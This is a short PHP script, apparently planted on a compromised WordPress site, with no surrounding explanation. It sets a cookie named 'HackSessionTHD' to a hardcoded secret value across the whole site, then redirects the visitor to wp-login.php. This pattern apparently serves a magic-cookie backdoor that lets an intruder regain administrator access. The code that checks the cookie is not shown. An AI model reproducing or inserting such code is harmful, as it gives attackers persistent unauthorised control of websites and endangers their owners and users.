<?php
$admin_cookie_code="babsdgsdgylongroup36dfdfgdfg5345345345fdsg2356fiashfjashfiuashf2010";
setcookie("HackSessionTHD",$admin_cookie_code,0,"/");
 header("Location:  /wp-login.php");
?>